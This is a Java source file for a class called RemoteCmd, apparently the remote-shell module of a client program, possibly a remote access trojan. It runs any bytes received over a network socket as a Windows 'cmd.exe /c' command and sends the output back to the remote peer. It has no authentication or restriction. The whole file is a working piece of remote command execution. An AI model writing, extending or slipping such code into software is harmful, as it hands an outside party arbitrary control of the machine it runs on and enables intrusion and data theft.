package me.client.send;

import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class RemoteCmd {
    Socket socket;
    public RemoteCmd(Socket socket) {
        this.socket = socket;
    }
    public void cmdExecute(byte[] bytes) throws Exception{
        String tempStr = "";
        String str = "";
        ProcessBuilder processBuilder = new ProcessBuilder().command("cmd.exe","/c",new String(bytes));
        Process process = processBuilder.start();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(),"GBK"));
        while ((tempStr= bufferedReader.readLine())!=null) {
            str += tempStr + "\n";
        }
        SendMessage.Send(MessageFlags.EXECUTE_REMOTE_CMD,str.getBytes(),socket);
    }
}